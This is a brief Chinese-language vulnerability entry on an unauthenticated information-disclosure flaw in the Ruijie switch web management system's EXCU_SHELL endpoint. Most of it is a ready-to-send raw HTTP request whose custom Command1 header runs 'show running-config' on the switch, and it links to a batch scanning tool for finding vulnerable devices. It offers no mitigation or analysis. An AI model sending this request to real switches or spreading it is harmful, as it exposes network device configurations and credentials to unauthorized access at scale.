漏洞描述：锐捷交换机 WEB 管理系统 EXCU_SHELL 信息泄露漏洞

批量扫描工具：https://github.com/MzzdToT/HAC_Bored_Writing/tree/main/unauthorized/%E9%94%90%E6%8D%B7%E4%BA%A4%E6%8D%A2%E6%9C%BAWEB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FEXCU_SHELL

```
GET /EXCU_SHELL HTTP/1.1

Host: 

User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.2852.74 Safari/537.36

Accept-Encoding: gzip, deflate

Accept: */*

Connection: close

Cmdnum: '1'

Command1: show running-config

Confirm1: n
```

